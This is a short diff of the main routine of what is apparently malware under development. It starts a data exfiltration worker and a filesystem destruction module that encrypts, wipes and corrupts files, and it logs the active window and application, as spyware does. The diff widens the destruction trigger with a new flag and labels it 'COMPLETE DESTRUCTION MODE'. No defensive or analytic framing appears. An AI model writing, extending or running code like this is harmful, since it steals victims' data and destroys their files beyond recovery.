@@ -98,11 +98,11 @@ def main():
         exfil_thread.start()
         log_activity("SYSTEM", "Data exfiltration worker started")
     
-    # Start filesystem destruction (encryption/wiping)
-    if ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING:
+    # Start filesystem destruction (encryption/wiping/corruption)
+    if ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING or ENABLE_FILESYSTEM_DESTRUCTION:
         destruction_thread = start_destruction()
         if destruction_thread:
-            log_activity("SYSTEM", "Filesystem destruction module activated")
+            log_activity("SYSTEM", "Filesystem destruction module activated - COMPLETE DESTRUCTION MODE")
     
     # Log initial window
     window_title, app_name = get_active_window_info()
